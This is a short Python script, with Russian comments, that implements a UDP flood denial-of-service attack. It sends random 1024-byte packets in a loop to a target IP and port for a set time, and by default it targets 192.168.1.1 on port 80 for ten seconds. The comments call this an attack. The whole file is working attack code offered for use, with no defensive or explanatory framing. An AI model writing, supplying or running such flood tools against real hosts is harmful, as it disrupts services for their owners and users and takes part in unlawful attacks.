import socket
import random
import time


def flood(ip: str,
          port: int,
          flood_duration: int):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  # Пакет размером 1024 байта
    timeout = time.time() + flood_duration
    sent = 0

    while time.time() < timeout:
        client.sendto(bytes, (ip, port))
        sent += 1
        print(f"Пакет {sent} отправлен на {ip} через порт {port}")


if __name__ == "__main__":
    target_ip = "192.168.1.1"  # IP-адрес цели
    target_port = 80  # Порт цели
    duration = 10  # Продолжительность атаки в секундах
    flood(target_ip, target_port, duration)
